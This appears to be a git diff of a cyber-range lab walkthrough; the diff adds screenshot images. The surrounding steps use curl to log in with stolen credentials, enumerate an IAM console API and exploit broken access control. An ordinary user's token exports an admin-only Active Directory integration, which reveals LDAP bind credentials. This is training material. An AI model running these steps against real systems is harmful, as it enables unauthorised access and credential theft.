@@ -17,7 +17,13 @@ curl -s http://11.0.2.50:8080/api/v1/version
 # {"service": "PUL Cloud IAM Console", "version": "3.1.0"}
 ```
 
+<img width="1494" height="580" alt="image" src="https://github.com/user-attachments/assets/289cc07f-ab7a-4bf6-9fb7-7cad200e3030" />
+
+
 Navigate to `http://11.0.2.50:8080` — the IAM Console login page.
+
+<img width="2031" height="433" alt="image" src="https://github.com/user-attachments/assets/f157529e-9119-4264-bf36-7268dec9fcbd" />
+
 
 ## Step 2 — Authenticate with Stolen Credentials
 
@@ -38,6 +44,9 @@ echo "Token: ${TOKEN}"
 ```
 Role is `iam_user` — not `iam_admin`. The UI will show restricted features.
 
+<img width="2023" height="667" alt="image" src="https://github.com/user-attachments/assets/63e16eee-c88b-4e00-bd77-8b1cddcbb9c7" />
+
+
 ## Step 3 — Enumerate the API
 
 Browse the authenticated dashboard at `http://11.0.2.50:8080/dashboard`. Navigate to **Integrations** — you see an AD integration tile with a 🔒 padlock labeled "Admin only." The UI button is disabled for iam_user accounts.
@@ -52,6 +61,8 @@ curl -s -H "Authorization: Bearer ${TOKEN}" \
 # Returns list of integrations including:
 # {"id": "int-ad-corp-001", "name": "Corporate AD", "type": "ldap", "status": "active"}
 ```
+<img width="1994" height="422" alt="image" src="https://github.com/user-attachments/assets/04d35866-b67d-4752-b6e3-70285d292a6c" />
+
 
 ## Step 4 — Exploit the Broken Access Control (THE GOAL)
 
@@ -63,6 +74,8 @@ curl -s -H "Authorization: Bearer ${TOKEN}" \
     "http://11.0.2.50:8080/api/v1/integrations/int-ad-corp-001/export" \
     | python3 -m json.tool
 ```
+<img width="1918" height="318" alt="image" src="https://github.com/user-attachments/assets/5c119998-4db0-4fe5-beb8-b7b95ea90a8b" />
+
 
 Response:
 ```json
@@ -81,6 +94,8 @@ Response:
   "web_admin_panel": "http://33.55.55.129/admin/"
 }
 ```
+<img width="1393" height="891" alt="image" src="https://github.com/user-attachments/assets/9c29597a-c207-439a-a5ad-5cd16c83e11a" />
+
 
 **Stolen LDAP credentials:**
 - Bind DN: `CN=svc_ldap,CN=Users,DC=cyberange,DC=local`
